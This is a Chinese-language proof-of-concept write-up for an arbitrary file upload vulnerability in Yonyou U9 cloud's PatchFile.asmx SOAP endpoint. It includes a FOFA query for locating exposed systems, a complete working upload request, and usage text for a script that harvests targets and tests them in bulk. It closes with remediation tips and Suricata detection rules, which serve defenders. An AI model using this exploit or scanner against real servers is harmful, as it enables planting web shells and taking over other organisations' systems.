### 产品简介  
U9 cloud聚焦中型和中大型制造企业，全面支持业财税档一体化、设计制造一体化、计划执行一体化、营销服务一体化、项目制造一体化等数智制造场景，赋能组织变革和商业创新，融合产业互联网资源实现连接、共享、协同，助力制造企业高质量发展。  

### 漏洞概述  
用友U9 PathchFile.asmx接口处存在文件上传漏洞，恶意攻击者可能会上传shell文件获取服务器权限，造成安全隐患。  

### 指纹识别  
fofa: title=="        U9-登录    "  
![Image text](https://github.com/YUUKI4O4/POC/blob/main/Yongyou_U9_PatchFile.asmx_arbitrary_file_upload/0.png)  

### 漏洞利用  
```
poc:
POST /CS/Office/AutoUpdates/PatchFile.asmx HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36
Connection: close
Content-Type: text/xml; charset=utf-8
  
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <SaveFile xmlns="http://tempuri.org/">
      <binData>MTIzNDU2</binData>
      <path>./</path>
      <fileName>1.txt</fileName>
    </SaveFile>
  </soap:Body>
</soap:Envelope>

```
![Image text](https://github.com/YUUKI4O4/POC/blob/main/Yongyou_U9_PatchFile.asmx_arbitrary_file_upload/1.png)  
![Image text](https://github.com/YUUKI4O4/POC/blob/main/Yongyou_U9_PatchFile.asmx_arbitrary_file_upload/2.png)  
![Image text](https://github.com/YUUKI4O4/POC/blob/main/Yongyou_U9_PatchFile.asmx_arbitrary_file_upload/3.png)  

### 测试和利用脚本  
```
python3 Yongyou_U9_PatchFile.asmx_arbitrary_file_upload.py -h
usage: Yongyou_U9_PatchFile.asmx_arbitrary_file_upload.py [-h] [-t] [-r FILE] [-u URL]

### Yongyou U9 PatchFile.asmx arbitrary file upload. ###

options:
  -h, --help            show this help message and exit
  -t, --target_collection
                        Perform target collection
  -r FILE, --multi_objective_testing FILE
                        Perform multi-objective testing. e.g:python
                        Yongyou_U9_PatchFile.asmx_arbitrary_file_upload.py.py -r ./url.txt
  -u URL, --single_objective_testing URL
                        Perform single-objective testing. e.g:python
                        Yongyou_U9_PatchFile.asmx_arbitrary_file_upload.py.py -u http://xxx.xxx.xxx
```

### 修复建议  
1、请联系厂商进行修复。  
2、如非必要，禁止公网访问该系统。  
3、设置白名单访问。  

### Suricata rules  
```
alert http any any -> any any (msg:"Yongyou U9 PatchFile.asmx arbitrary file upload"; flow:established,to_server; flowbits:set,Yongyou_U9_PatchFile; content:"post";http_method;nocase; content:"/CS/Office/AutoUpdates/PatchFile.asmx?op=SaveFile";http_uri;fast_pattern;nocase; content:"<?xml";nocase;http_client_body;startswith; content:"<binData>";nocase;http_client_body; content:"<fileName>";nocase;http_client_body; pcre:"/<fileName>[^\.]+?\.(jsp|asp|aspx|txt|php|exe|py|dll)/Pi"; reference:url,https://github.com/YUUKI4O4/POC/tree/main/Yongyou_U9_PatchFile.asmx_arbitrary_file_upload; classtype:web-attck; metadata:created_at 2024-01-31,updated_at 2024-01-31,creater:YUUKI4O4; sid:27; rev:1;)
alert http any any -> any any (msg:"Yongyou U9 PatchFile.asmx arbitrary file upload maybe success"; flow:established,from_server; flowbits:isset,Yongyou_U9_PatchFile; content:"415";http_stat_code; reference:url,https://github.com/YUUKI4O4/POC/tree/main/Yongyou_U9_PatchFile.asmx_arbitrary_file_upload; classtype:web-attck; metadata:created_at 2024-01-31,updated_at 2024-01-31,creater:YUUKI4O4; sid:28; rev:1;)
```
